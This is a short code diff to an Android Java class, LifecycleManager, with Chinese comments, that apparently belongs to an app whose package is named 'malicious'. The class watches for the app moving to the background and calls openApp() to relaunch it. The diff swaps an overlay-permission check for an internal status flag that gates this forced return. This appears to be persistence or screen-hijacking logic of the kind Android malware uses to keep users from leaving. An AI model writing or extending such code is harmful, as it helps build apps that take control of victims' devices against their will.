@@ -2,19 +2,16 @@ package com.example.service;
 
 import android.app.Activity;
 import android.app.Application;
-import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
-import android.provider.Settings;
 import androidx.annotation.NonNull;
 import com.example.malicious.MainActivity;
 
 
-// 应用程序类
+// App唤醒
 public class LifecycleManager extends Application {
     private int countActivity = 0; // 用于记录处于活动状态的 Activity 数量
     private boolean isBackground = false; // 标记应用是否处于后台
-    private final Context context = this; // 上下文对象
 
 
     // 注册监听应用进入后台和回到前台的回调方法
@@ -52,7 +49,7 @@ public class LifecycleManager extends Application {
                 countActivity--;
                 if (countActivity <= 0 && !isBackground) {
                     isBackground = true;
-                    if (Settings.canDrawOverlays(context)) openApp(); // 检查悬浮窗权限并打开应用
+                    if (MainActivity.appStatus) openApp();
                 };
             };
         });
